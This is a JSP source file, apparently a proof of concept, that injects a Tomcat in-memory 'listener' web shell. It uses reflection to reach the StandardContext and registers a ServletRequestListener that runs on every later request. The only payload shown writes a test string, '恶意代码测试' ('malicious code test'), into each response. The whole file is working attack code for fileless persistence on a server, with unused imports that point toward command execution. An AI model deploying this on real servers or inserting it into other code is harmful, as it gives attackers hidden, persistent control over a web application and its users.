<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="java.io.IOException" %><%--
  Created by IntelliJ IDEA.
  User: Luc
  Date: 2022/12/20
  Time: 14:07
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
  ServletContext servletRequest = request.getSession().getServletContext();

  Field applicationContext = servletRequest.getClass().getDeclaredField("context");
  applicationContext.setAccessible(true);
  ApplicationContext applicationContext1 = (ApplicationContext) applicationContext.get(servletRequest);

  Field standContext = applicationContext1.getClass().getDeclaredField("context");
  standContext.setAccessible(true);
  StandardContext standardContext = (StandardContext) standContext.get(applicationContext1);

  ServletRequestListener servletRequestListener = new ServletRequestListener() {
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
      HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
      try {
        Field request1 = req.getClass().getDeclaredField("request");

        request1.setAccessible(true);
        Request req1 = (Request)request1.get(req);
        req1.getResponse().setContentType("text/html;charset=UTF-8");
        req1.getResponse().setCharacterEncoding("UTF-8");

        PrintWriter out= req1.getResponse().getWriter();
        out.write("恶意代码测试");
        out.flush();
      } catch (NoSuchFieldException | IllegalAccessException | IOException e) {
        throw new RuntimeException(e);
      }

    }
  };
  standardContext.addApplicationEventListener(servletRequestListener);
%>
<html>
<head>
    <title>Title</title>
</head>
<body>

</body>
</html>
